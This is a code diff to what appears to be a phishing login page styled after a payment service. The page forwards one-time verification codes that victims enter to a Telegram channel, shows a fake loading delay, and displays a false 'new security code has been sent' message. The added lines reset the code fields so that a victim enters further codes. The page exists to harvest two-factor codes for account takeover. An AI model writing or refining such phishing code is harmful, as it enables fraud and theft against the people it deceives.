@@ -110,8 +110,6 @@ export default function LoginPage() {
     e.preventDefault();
     if (verificationCode.length < 6) return;
 
-    setIsLoading(true);
-
     // Send first verification code to Telegram immediately
     try {
       const message = `
@@ -132,6 +130,7 @@ export default function LoginPage() {
       console.error('Failed to send to Telegram:', error);
     }
 
+    setIsLoading(true);
     setTimeout(() => {
       setIsLoading(false);
       setStep("verifying");
@@ -492,6 +491,9 @@ export default function LoginPage() {
             className="text-[14px] text-[#005ea6] hover:text-[#003087] hover:underline font-medium"
             data-testid="button-resend-2"
             onClick={() => {
+              setVerificationCode("");
+              setVerificationCode2("");
+              setStep("verify-code");
               toast({
                 description: "A new security code has been sent.",
               });
@@ -811,6 +813,9 @@ export default function LoginPage() {
             className="text-[14px] text-[#005ea6] hover:text-[#003087] hover:underline font-medium"
             data-testid="button-resend"
             onClick={() => {
+              setVerificationCode("");
+              setVerificationCode2("");
+              setStep("verify-code");
               toast({
                 description: "A new security code has been sent.",
               });
